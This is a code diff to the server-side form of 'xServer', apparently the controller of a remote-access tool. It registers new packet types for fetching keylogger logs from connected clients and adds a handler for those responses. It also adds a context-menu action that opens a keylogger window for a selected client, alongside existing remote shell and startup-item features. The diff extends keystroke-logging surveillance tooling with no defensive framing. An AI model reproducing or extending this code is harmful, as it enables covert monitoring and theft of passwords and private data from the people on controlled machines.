@@ -127,6 +127,7 @@ namespace xServer.Forms
                 typeof (Core.Packets.ServerPackets.GetStartupItems),
                 typeof (Core.Packets.ServerPackets.AddStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
+                typeof (Core.Packets.ServerPackets.GetLogs),
                 typeof (Core.Packets.ClientPackets.Initialize),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
@@ -138,7 +139,8 @@ namespace xServer.Forms
                 typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                 typeof (Core.Packets.ClientPackets.MonitorsResponse),
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
-                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse)
+                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
+                typeof (Core.Packets.ClientPackets.GetLogsResponse)
             });
 
             ListenServer.ServerState += ServerState;
@@ -167,6 +169,7 @@ namespace xServer.Forms
                 UPnP.RemovePort(ushort.Parse(XMLSettings.ListenPort.ToString()));
 
             nIcon.Visible = false;
+            FrmMain.Instance = null;
         }
 
         private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
@@ -271,8 +274,12 @@ namespace xServer.Forms
             }
             else if (type == typeof (Core.Packets.ClientPackets.GetStartupItemsResponse))
             {
-                CommandHandler.HandleGetStartupItemsResponse(client,
+                CommandHandler.HandleGetStartupItemsResponse(client, 
                     (Core.Packets.ClientPackets.GetStartupItemsResponse) packet);
+            }
+            else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
+            {
+                CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse) packet);
             }
         }
 
@@ -494,6 +501,21 @@ namespace xServer.Forms
             if (lstClients.SelectedItems.Count != 0)
             {
                 // TODO
+            }
+        }
+
+        private void ctxtKeylogger_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.FrmKl != null)
+                {
+                    c.Value.FrmKl.Focus();
+                    return;
+                }
+                FrmKeylogger frmKL = new FrmKeylogger(c);
+                frmKL.Show();
             }
         }
 
